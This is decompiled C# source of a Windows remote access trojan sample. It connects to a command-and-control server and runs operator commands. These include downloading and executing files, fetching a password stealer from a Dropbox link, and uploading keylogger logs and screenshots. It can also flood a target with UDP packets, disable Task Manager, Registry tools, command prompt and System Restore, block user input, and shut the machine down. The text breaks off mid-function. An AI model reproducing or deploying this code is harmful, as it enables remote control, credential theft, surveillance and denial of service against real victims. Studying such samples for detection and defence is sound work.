// Decompiled with JetBrains decompiler
// Type: w.OK
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5004447C-EAE7-4981-86A7-4BF4BBDD8425
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.Win32.Generic-1c045ca8ebd2cfca8898883aec510da9b67fedb0e0db31000e1b123f846add37.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using w.My;

namespace w
{
  public class OK
  {
    public static string TIP;
    public static string Tport;
    public static int delay;
    public static bool udp;
    private static byte[] b = new byte[5121];
    public static bool BD = Conversions.ToBoolean("False");
    public static TcpClient C = (TcpClient) null;
    public static bool Cn = false;
    public static string DR = "TEMP";
    public static string EXE = "server.exe";
    public static Computer F = new Computer();
    public static FileStream FS;
    private static string H = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.MH(OK.HH)))));
    public static string HH = "127.0.0.1";
    public static bool Idr = Conversions.ToBoolean("False");
    public static bool IsF = Conversions.ToBoolean("False");
    public static bool Isu = Conversions.ToBoolean("False");
    public static kl kq = (kl) null;
    private static string lastcap = "";
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    private static MemoryStream MeM = new MemoryStream();
    public static object MT = (object) null;
    public static int NH = 0;
    public static string P = "5552";
    public static object PLG = (object) null;
    public static string RG = "165d6ed988ac1dbec1627a1ca9899d84";
    public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public static string sizk = "20";
    public static string VN = "SGFjS2Vk";
    public static string VR = "im523";
    public static string Y = "|'|'|";
    public static bool HD = Conversions.ToBoolean("False");
    public static string anti = "Exsample.exe";
    public static bool anti2 = Conversions.ToBoolean("False");
    public static bool usb = Conversions.ToBoolean("False");
    public static string usbx = "svchost.exe";
    public static bool task = Conversions.ToBoolean("False");
    public static mgr mg = (mgr) null;

    [DebuggerNonUserCode]
    public OK()
    {
    }

    private static void im(object a0) => OK.Ind((byte[]) a0);

    private static void im(object a0, SessionEndingEventArgs a1) => OK.ED();

    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
          return "";
        string str2 = Strings.Space(checked (OK.GetWindowTextLength((long) foregroundWindow) + 1));
        OK.GetWindowText(foregroundWindow, ref str2, str2.Length);
        str1 = OK.ENB(ref str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          int wDriver = (int) checked ((short) num);
          string str1 = Strings.Space(100);
          ref string local1 = ref str1;
          string str2 = (string) null;
          ref string local2 = ref str2;
          if (OK.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    public static bool connect()
    {
      OK.Cn = false;
      Thread.Sleep(2000);
      lock (OK.LO)
      {
        try
        {
          if (OK.C != null)
          {
            try
            {
              OK.C.Close();
              OK.C = (TcpClient) null;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            OK.MeM.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.MeM = new MemoryStream();
          OK.C = new TcpClient();
          OK.C.ReceiveBufferSize = 204800;
          OK.C.SendBufferSize = 204800;
          OK.C.Client.SendTimeout = 10000;
          OK.C.Client.ReceiveTimeout = 10000;
          NewLateBinding.LateCall((object) OK.C, (System.Type) null, "Connect", new object[2]
          {
            RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.MH(OK.HH)))),
            (object) Conversions.ToInteger(OK.P)
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
          OK.H = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.MH(OK.HH)));
          OK.Cn = true;
          OK.Send(OK.inf());
          try
          {
            string str1;
            string str2;
            if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")), (object) "", false))
            {
              str2 = str1 + OK.DEB(ref OK.VN) + "\r\n";
            }
            else
            {
              string str3 = str1;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")));
              string str4 = OK.DEB(ref s);
              str2 = str3 + str4 + "\r\n";
            }
            string s1 = str2 + OK.H + ":" + OK.P + "\r\n" + OK.DR + "\r\n" + OK.EXE + "\r\n" + Conversions.ToString(OK.Idr) + "\r\n" + Conversions.ToString(OK.IsF) + "\r\n" + Conversions.ToString(OK.Isu) + "\r\n" + Conversions.ToString(OK.BD) + "\r\n" + Conversions.ToString(OK.HD) + "\r\n" + Conversions.ToString(OK.usb) + "\r\n" + Conversions.ToString(OK.anti2) + "\r\n" + Conversions.ToString(OK.task);
            OK.Send("inf" + OK.Y + OK.ENB(ref s1));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          OK.Cn = false;
          ProjectData.ClearProjectError();
        }
      }
      return OK.Cn;
    }

    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return OK.BS(ref B);
    }

    public static void DLV(string n)
    {
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ED() => OK.pr(0);

    public static string ENB(ref string s) => Convert.ToBase64String(OK.SB(ref s));

    public static object GTV(string n, object ret)
    {
      object obj;
      try
      {
        obj = OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = ret;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static string HWD()
    {
      string str;
      try
      {
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        string lpVolumeNameBuffer = (string) null;
        int nVolumeNameSize = 0;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        int lpVolumeSerialNumber;
        OK.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, nVolumeNameSize, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        str = Conversion.Hex(lpVolumeSerialNumber);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str = "ERR";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static object MH(string H)
    {
      string[] strArray = Strings.Split(H, ",");
      if (OK.NH >= strArray.Length)
        OK.NH = 0;
      return (object) strArray[OK.NH];
    }

    [DllImport("user32", EntryPoint = "BlockInput", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int apiBlockInput(int fBlock);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long SwapMouseButton(long bSwap);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long mciSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString,
      long uReturnLength,
      long hwndCallback);

    [DllImport("KERNEL32.DLL")]
    public static extern void Beep(int freq, int dur);

    public static void AddHome(string text) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", true).SetValue("Start Page", (object) text);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(OK.BS(ref b), OK.Y);
      try
      {
        string Left1 = strArray1[0];
        string Left2 = Left1;
        if (Operators.CompareString(Left2, "nwpr", false) == 0)
          Process.Start(strArray1[1]);
        else if (Operators.CompareString(Left2, "site", false) == 0)
          OK.Send("site");
        else if (Operators.CompareString(Left2, "fun", false) == 0)
          OK.Send("fun");
        else if (Operators.CompareString(Left2, "IEhome", false) == 0)
          OK.AddHome(strArray1[1]);
        else if (Operators.CompareString(Left2, "shutdowncomputer", false) == 0)
          Interaction.Shell("shutdown -s -t 00", AppWinStyle.Hide);
        else if (Operators.CompareString(Left2, "restartcomputer", false) == 0)
          Interaction.Shell("shutdown -r -t 00", AppWinStyle.Hide);
        else if (Operators.CompareString(Left2, "logoff", false) == 0)
          Interaction.Shell("shutdown -l -t 00", AppWinStyle.Hide);
        else if (Operators.CompareString(Left2, "ErorrMsg", false) == 0)
        {
          string Left3 = strArray1[1];
          MessageBoxIcon icon;
          if (Operators.CompareString(Left3, "1", false) == 0)
            icon = MessageBoxIcon.Asterisk;
          else if (Operators.CompareString(Left3, "2", false) == 0)
            icon = MessageBoxIcon.Question;
          else if (Operators.CompareString(Left3, "3", false) == 0)
            icon = MessageBoxIcon.Exclamation;
          else if (Operators.CompareString(Left3, "4", false) == 0)
            icon = MessageBoxIcon.Hand;
          string Left4 = strArray1[2];
          MessageBoxButtons buttons;
          if (Operators.CompareString(Left4, "1", false) == 0)
            buttons = MessageBoxButtons.YesNo;
          else if (Operators.CompareString(Left4, "2", false) == 0)
            buttons = MessageBoxButtons.YesNoCancel;
          else if (Operators.CompareString(Left4, "3", false) == 0)
            buttons = MessageBoxButtons.OK;
          else if (Operators.CompareString(Left4, "4", false) == 0)
            buttons = MessageBoxButtons.OKCancel;
          else if (Operators.CompareString(Left4, "5", false) == 0)
            buttons = MessageBoxButtons.RetryCancel;
          else if (Operators.CompareString(Left4, "6", false) == 0)
            buttons = MessageBoxButtons.AbortRetryIgnore;
          int num = (int) MessageBox.Show(strArray1[4], strArray1[3], buttons, icon);
        }
        else if (Operators.CompareString(Left2, "peech", false) == 0)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
          object[] objArray1 = new object[1];
          object[] objArray2 = objArray1;
          string[] strArray2 = strArray1;
          string[] strArray3 = strArray2;
          int index1 = 1;
          int index2 = index1;
          string str = strArray3[index2];
          objArray2[0] = (object) str;
          object[] objArray3 = objArray1;
          object[] Arguments = objArray3;
          bool[] flagArray = new bool[1]{ true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray[0])
            strArray2[index1] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (string));
        }
        else if (Operators.CompareString(Left2, "BepX", false) == 0)
          OK.Beep(checked ((int) Math.Round(Conversion.Val(strArray1[1]))), checked ((int) Math.Round(Conversion.Val(strArray1[2]))));
        else if (Operators.CompareString(Left2, "piano", false) == 0)
          OK.Beep(checked ((int) Math.Round(Conversion.Val(strArray1[1]))), 300);
        else if (Operators.CompareString(Left2, "OpenCD", false) == 0)
        {
          string str1 = "set CDAudio door open";
          ref string local1 = ref str1;
          string str2 = "";
          ref string local2 = ref str2;
          OK.mciSendString(ref local1, ref local2, 0L, 0L);
        }
        else if (Operators.CompareString(Left2, "CloseCD", false) == 0)
        {
          string str3 = "set CDAudio door closed";
          ref string local3 = ref str3;
          string str4 = "";
          ref string local4 = ref str4;
          OK.mciSendString(ref local3, ref local4, 0L, 0L);
        }
        else if (Operators.CompareString(Left2, "DisableKM", false) == 0)
          OK.apiBlockInput(1);
        else if (Operators.CompareString(Left2, "EnableKM", false) == 0)
          OK.apiBlockInput(0);
        else if (Operators.CompareString(Left2, "TurnOffMonitor", false) == 0)
          OK.SendMessage(-1, 274U, 61808U, 2);
        else if (Operators.CompareString(Left2, "TurnOnMonitor", false) == 0)
          OK.SendMessage(-1, 274U, 61808U, -1);
        else if (Operators.CompareString(Left2, "NormalMouse", false) == 0)
          OK.SwapMouseButton(0L);
        else if (Operators.CompareString(Left2, "ReverseMouse", false) == 0)
          OK.SwapMouseButton(256L);
        else if (Operators.CompareString(Left2, "DisableCMD", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "1", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "EnableCMD", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "0", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "DisableRegistry", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "EnableRegistry", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "0", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "DisableRestore", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "EnableRestore", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "0", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "DisableTaskManager", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "EnableTaskManager", false) == 0)
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "0", RegistryValueKind.DWord);
        else if (Operators.CompareString(Left2, "CursorShow", false) == 0)
          Cursor.Show();
        else if (Operators.CompareString(Left2, "CursorHide", false) == 0)
          Cursor.Hide();
        else if (Operators.CompareString(Left2, "sendmusicplay", false) == 0)
        {
          System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
          Thread.Sleep(1000);
          MyProject.Computer.Audio.Stop();
          MyProject.Computer.Audio.Play(Path.GetTempPath() + strArray1[1], AudioPlayMode.Background);
        }
        else if (Operators.CompareString(Left2, "OpenSite", false) == 0)
          Process.Start(strArray1[1]);
        else if (Operators.CompareString(Left2, "dos", false) == 0)
          OK.Send("dos");
        else if (Operators.CompareString(Left2, "udp", false) == 0)
        {
          OK.Send("udp");
          OK.TIP = strArray1[1];
          OK.Tport = strArray1[2];
          OK.delay = Conversions.ToInteger(strArray1[3]);
          OK.udp = true;
          try
          {
            while (true)
            {
              if (OK.udp)
              {
                try
                {
                  new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(new byte[4096], (EndPoint) new IPEndPoint(IPAddress.Parse(OK.TIP), Conversions.ToInteger(OK.Tport)));
                  Thread.Sleep(OK.delay);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              else
                goto label_124;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "udpstp", false) == 0)
          OK.udp = false;
        else if (Operators.CompareString(Left2, "pingstop", false) == 0)
        {
          Interaction.Shell("taskkill /F /IM PING.EXE", AppWinStyle.Hide);
        }
        else
        {
          if (Operators.CompareString(Left2, "ll", false) == 0)
          {
            OK.Cn = false;
            return;
          }
          if (Operators.CompareString(Left2, "kl", false) == 0)
          {
            OK.Send("kl" + OK.Y + OK.ENB(ref OK.kq.Logs));
            return;
          }
          if (Operators.CompareString(Left2, "pas", false) == 0)
          {
            try
            {
              string str = Interaction.Environ("temp") + "/pass.exe";
              if (!System.IO.File.Exists(str))
              {
                try
                {
                  new WebClient().DownloadFile("https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", str);
                  Process.Start(str);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              else
                goto label_110;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
label_110:
            try
            {
              string s = System.IO.File.ReadAllText(Interaction.Environ("temp") + "/temp.txt");
              OK.Send("pas" + OK.Y + OK.ENB(ref s));
              return;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            if (Operators.CompareString(Left2, "ll", false) == 0)
            {
              OK.Cn = false;
              return;
            }
            if (Operators.CompareString(Left2, "kl", false) == 0)
            {
              OK.Send("kl" + OK.Y + OK.ENB(ref OK.kq.Logs));
              return;
            }
            if (Operators.CompareString(Left2, "prof", false) == 0)
            {
              string Left5 = strArray1[1];
              if (Operators.CompareString(Left5, "~", false) == 0)
              {
                OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                return;
              }
              if (Operators.CompareString(Left5, "!", false) == 0)
              {
                OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + OK.Y + strArray1[1] + OK.Y), RuntimeHelpers.GetObjectValue(OK.GTV(strArray1[1], (object) ""))))));
                return;
              }
              if (Operators.CompareString(Left5, "@", false) != 0)
                return;
              OK.DLV(strArray1[2]);
              return;
            }
          }
        }
label_124:
        if (Operators.CompareString(Left1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = OK.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Execute ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Download ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          OK.Send("bla");
          string str = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str);
            OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(str).Name);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception = ex;
            OK.Send("MSG" + OK.Y + "Execute ERROR " + exception.Message);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          string Left6 = Left1;
          if (Operators.CompareString(Left6, "inv", false) == 0)
          {
            byte[] numArray = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[3].Length < 10 & numArray.Length == 0)
            {
              OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[3].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y + strArray1[2] + OK.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = OK.ZIP(memoryStream.ToArray());
                OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(numArray, "A"))));
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
              {
                (object) OK.H
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
              {
                (object) OK.P
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
              {
                (object) strArray1[2]
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !OK.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
                Thread.Sleep(1);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
              {
                (object) true
              }, (string[]) null, (System.Type[]) null);
            }
          }
          else if (Operators.CompareString(Left6, "ret", false) == 0)
          {
            byte[] numArray = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[2].Length < 10 & numArray.Length == 0)
            {
              OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[2].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = OK.ZIP(memoryStream.ToArray());
                OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(numArray, "A"))));
              string[] strArray4 = new string[5]
              {
                "ret",
                OK.Y,
                strArray1[1],
                OK.Y,
                null
              };
              string[] strArray5 = strArray4;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
              string str = OK.ENB(ref s);
              strArray5[4] = str;
              OK.Send(string.Concat(strArray4));
            }
          }
          else if (Operators.CompareString(Left6, "CAP", false) == 0)
          {
            Rectangle targetRect = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
            Graphics g = Graphics.FromImage((Image) bitmap1);
            Size size = new Size(bitmap1.Width, bitmap1.Height);
            g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
            try
            {
              size = new Size(32, 32);
              targetRect = new Rectangle(Cursor.Position, size);
              Cursors.Default.Draw(g, targetRect);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            g.Dispose();
            Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
            Graphics graphics = Graphics.FromImage((Image) bitmap2);
            graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
            graphics.Dispose();
            MemoryStream memoryStream1 = new MemoryStream();
            string S = "CAP" + OK.Y;
            b = OK.SB(ref S);
            memoryStream1.Write(b, 0, b.Length);
            MemoryStream memoryStream2 = new MemoryStream();
            bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
            string Left7 = OK.md5(memoryStream2.ToArray());
            if (Operators.CompareString(Left7, OK.lastcap, false) != 0)
            {
              OK.lastcap = Left7;
              memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
            }
            else
              memoryStream1.WriteByte((byte) 0);
            OK.Sendb(memoryStream1.ToArray());
            memoryStream1.Dispose();
            memoryStream2.Dispose();
            bitmap1.Dispose();
            bitmap2.Dispose();
          }
          else if (Operators.CompareString(Left6, "un", false) == 0)
          {
            string Left8 = strArray1[1];
            if (Operators.CompareString(Left8, "~", false) == 0)
              OK.UNS();
            else if (Operators.CompareString(Left8, "!", false) == 0)
            {
              OK.pr(0);
              ProjectData.EndApp();
            }
            else
            {
              if (Operators.CompareString(Left8, "@", false) != 0)
                return;
              OK.pr(0);
              Process.Start(OK.LO.FullName);
              ProjectData.EndApp();
            }
          }
          else if (Operators.CompareString(Left1, "up", false) == 0)
          {
            byte[] bytes;
            if (strArray1[1][0] == '\u001F')
            {
              try
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + OK.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                bytes = OK.ZIP(memoryStream.ToArray());
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                OK.Send("MSG" + OK.Y + "Update ERROR");
                OK.Send("bla");
                ProjectData.ClearProjectError();
                return;
              }
            }
            else
            {
              WebClient webClient = new WebClient();
              try
              {
                bytes = webClient.DownloadData(strArray1[1]);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                OK.Send("MSG" + OK.Y + "Update ERROR");
                OK.Send("bla");
                ProjectData.ClearProjectError();
                return;
              }
            }
            OK.Send("bla");
            string str = Path.GetTempFileName() + ".exe";
            try
            {
              OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(str).Name);
              Thread.Sleep(2000);
              System.IO.File.WriteAllBytes(str, bytes);
              Process.Start(str, "..");
            }
            catch (Exception ex1)
            {
              ProjectData.SetProjectError(ex1);
              Exception ex2 = ex1;
              ProjectData.SetProjectError(ex2);
              Exception exception = ex2;
              OK.Send("MSG" + OK.Y + "Update ERROR " + exception.Message);
              ProjectData.ClearProjectError();
              return;
            }
            OK.UNS();
          }
          else if (Operators.CompareString(Left1, "Ex", false) == 0)
          {
            if (OK.PLG == null)
            {
              OK.Send("PLG");
              int num = 0;
